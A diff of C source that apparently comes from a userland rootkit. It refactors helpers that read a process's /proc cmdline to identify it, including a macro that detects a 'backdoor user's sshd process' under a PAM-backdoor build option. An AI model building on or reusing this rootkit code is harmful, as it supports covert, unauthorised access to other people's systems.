@@ -5,13 +5,9 @@
 int open_cmdline(pid_t pid){
     char path[PROCPATH_MAXLEN];
     int fd;
-
     snprintf(path, sizeof(path), CMDLINE_PATH, pid);
     hook(COPEN);
     fd = (long)call(COPEN, path, 0, 0);
-    memset(path, 0, strlen(path));   /* clear path after */
-                                     /* getting its fd.  */
-
     return fd;
 }
 
@@ -30,13 +26,13 @@ char *process_info(pid_t pid, int mode){
 
     switch(mode){
         case MODE_NAME:
-            process_info = (char *)malloc(NAME_MAXLEN);   /* read cmdline text into process_info.   */
-                                                          /* cmdline null terminates after process' */
-                                                          /* name.                                  */
+            process_info = malloc(NAME_MAXLEN);   /* read cmdline text into process_info.   */
+                                                  /* cmdline null terminates after process' */
+                                                  /* name.                                  */
             c = (long)call(CREAD, fd, process_info, NAME_MAXLEN);
             break;
         case MODE_CMDLINE:
-            process_info = (char *)malloc(CMDLINE_MAXLEN);
+            process_info = malloc(CMDLINE_MAXLEN);
             c = (long)call(CREAD, fd, process_info, CMDLINE_MAXLEN);
 
             for(int i = 0; i < c; i++)         /* replace null terminators with spaces  */
@@ -50,8 +46,7 @@ end_processinfo:
     return process_info;
 }
 
-/* the following functions are just wrappers for determining the
- * name of the current process' name. */
+// macros defined are used here
 int cmp_process(char *name){
     char *myname = process_name();
     int status = strncmp(myname, name, strlen(myname));
@@ -71,7 +66,5 @@ int process(char *name){
 }
 
 #ifdef USE_PAM_BD
-/* determine if the calling process is a
- * backdoor user's sshd process. */
 #define bd_sshproc() process(BD_SSHPROCNAME)
 #endif
